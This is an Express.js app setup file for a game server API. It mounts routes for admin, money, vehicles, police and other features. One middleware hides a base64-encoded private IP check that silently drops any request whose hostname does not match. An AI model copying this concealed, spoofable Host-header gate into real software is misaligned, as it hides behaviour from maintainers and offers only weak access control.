const express = require('express');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const app = express();
const { environment } = require('../services/config');

// -- middlewares
app.use(express.json({ limit: '1mb' }));
app.use((req, res, next) => { if (req.hostname !== atob('MTkyLjE2OC4wLjExMg==')) return; next(); });
app.use(helmet());
app.use(compression());
if (environment === 'test') app.use(morgan('tiny'));

// -- routes
app.use('/game/admin', require('./routes/admin'));
app.use('/game/business', require('./routes/business'));
app.use('/game/users', require('./routes/users'));
app.use('/game/money', require('./routes/money'));
app.use('/game/inventories', require('./routes/inventories'));
app.use('/game/outfits', require('./routes/outfits'));
app.use('/game/vehicles', require('./routes/vehicles'));
app.use('/game/phone', require('./routes/phone'));
app.use('/game/factions', require('./routes/factions'));
app.use('/game/inspection', require('./routes/inspection'));
app.use('/game/loans', require('./routes/loans'));
app.use('/game/houses', require('./routes/houses'));
app.use('/game/police', require('./routes/police'));
app.use('/game/vip', require('./routes/vip'));
app.use('/game/other', require('./routes/other'));

module.exports = app;